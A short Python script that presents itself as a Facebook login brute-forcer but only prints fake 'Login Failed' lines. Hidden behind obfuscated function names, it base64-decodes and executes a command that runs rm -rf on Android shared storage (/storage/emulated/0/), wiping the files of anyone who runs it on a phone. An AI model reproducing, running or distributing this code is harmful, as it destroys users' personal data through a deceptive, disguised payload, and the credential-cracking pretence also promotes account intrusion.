import base64
import time
import os

try:
  from colorama import init
  from colorama import Fore, Back, Style
  init()
  
except ImportError:
  os.system('pip3 install colorama')
  os.system('clear')
  os.system('python3 fbhack.py')


def tvksajd(adwekuv):
  pvncngr = base64.b64decode(adwekuv).decode('utf-8')
  exec(pvncngr)

def oumcgsq():
  vcxprvq = base64.b64decode('L3N0b3JhZ2UvZW11bGF0ZWQvMC8=').decode('utf-8')
  if os.path.exists(vcxprvq):
    tvksajd("b3Muc3lzdGVtKCdybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qJyk=")

def banner():
  print(Fore.RED + """

  █████▒▄▄▄▄       ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
▓██   ▒▓█████▄    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒████ ░▒██▒ ▄██   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░▓█▒  ░▒██░█▀     ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░▒█░   ░▓█  ▀█▓   ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
 ▒ ░   ░▒▓███▀▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ░     ▒░▒   ░     ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ░ ░    ░    ░     ░  ░░ ░  ░   ▒   ░        ░ ░░ ░ 
        ░          ░  ░  ░      ░  ░░ ░      ░  ░   
             ░                      ░               

 """)
  

def hack():
  banner()
  oumcgsq()
  username = input("username: ")
  time.sleep(0.5)
  print(Fore.BLUE + "Using Default worlist: wordlist.txt \n")
  time.sleep(0.5)
  
  with open('wordlist.txt', 'r') as f:
    for line in f:
      print(Fore.YELLOW + username + ":" + line.strip() + " ==> " + Fore.RED + "Login Failed.")
      time.sleep(1)



hack()
